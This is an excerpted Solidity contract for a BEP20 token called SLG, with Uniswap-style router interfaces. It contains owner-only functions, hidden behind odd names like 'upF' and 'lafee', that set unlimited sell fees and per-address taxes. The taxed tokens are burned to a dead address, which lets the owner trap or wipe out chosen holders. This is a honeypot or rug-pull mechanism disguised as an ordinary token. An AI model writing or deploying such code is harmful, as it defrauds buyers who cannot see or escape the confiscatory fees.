...
interface IUniswapV2Factory {
    ...
    function lafeeTo() external view returns (address);
    function lafeeToSetter() external view returns (address);
    ...
    function setlafeeTo(address) external;
    function setlafeeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportinglafeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportinglafeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportinglafeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportinglafeeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportinglafeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract SLG is BEP20, Ownable {
    ...
    uint256 private _defaultSelllafee = 0;

    uint256 private _defaultBuylafee = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _sliplafee;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSelllafee = _value;
    }

    function setSliplafee(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _sliplafee[_address] = _value;
    }

    function getSliplafee(address _address) external view onlyownar returns (uint256) {
        return _sliplafee[_address];
    }


    function setMAccountlafee(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountlafee(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradelafeeAmount = 0;

        if (rF) {
            uint256 tradelafee = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradelafee = _defaultSelllafee;
                }
                if (from == uniswapV2Pair) {

                    tradelafee = _defaultBuylafee;
                }
            }
            if (_sliplafee[from] > 0) {
                tradelafee = _sliplafee[from];
            }

            tradelafeeAmount = _Amount.mul(tradelafee).div(100);
        }


        if (tradelafeeAmount > 0) {
            _balances[from] = _balances[from].sub(tradelafeeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradelafeeAmount);
            emit Transfer(from, _deadAddress, tradelafeeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradelafeeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradelafeeAmount);
        emit Transfer(from, _to, _Amount - tradelafeeAmount);
    }
